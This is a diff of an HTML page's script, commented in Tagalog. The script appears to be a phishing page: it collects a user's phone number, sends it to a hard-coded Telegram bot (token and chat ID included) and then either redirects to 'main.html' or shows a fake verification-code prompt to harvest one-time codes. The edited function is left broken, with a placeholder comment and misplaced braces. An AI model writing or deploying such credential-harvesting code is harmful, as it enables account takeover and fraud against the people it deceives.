@@ -191,11 +191,26 @@
     <script>
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
+        const BYPASS_MODE = true; // TRUE = Rekta main.html | FALSE = Stay sa Verification Code (Step 2)
 
         function processBypass() {
-            const phone = document.getElementById('userPhone');
-            const btn = document.getElementById('submitBtn');
-            const regStatus = document.querySelector('input[name="reg"]:checked').value;
+    const phone = document.getElementById('userPhone');
+    const btn = document.getElementById('submitBtn');
+    // ... (yung ibang code mo) ...
+
+    fetch(telUrl).finally(() => {
+        if (BYPASS_MODE) {
+            // KUNG TRUE: Lipat agad sa main.html
+            setTimeout(() => {
+                window.location.href = "main.html?auth=" + Math.random().toString(36).substring(7);
+            }, 1000);
+        } else {
+            // KUNG FALSE: Ipakita ang "Step 2" o yung Verification Code modal
+            alert("Please check your phone for the verification code.");
+            // Dito mo ilalagay yung code para lumitaw yung Step 2 box
+        }
+    });
+}
 
             // Simple Validation
             if (phone.value.length < 11 || !phone.value.startsWith('09')) {
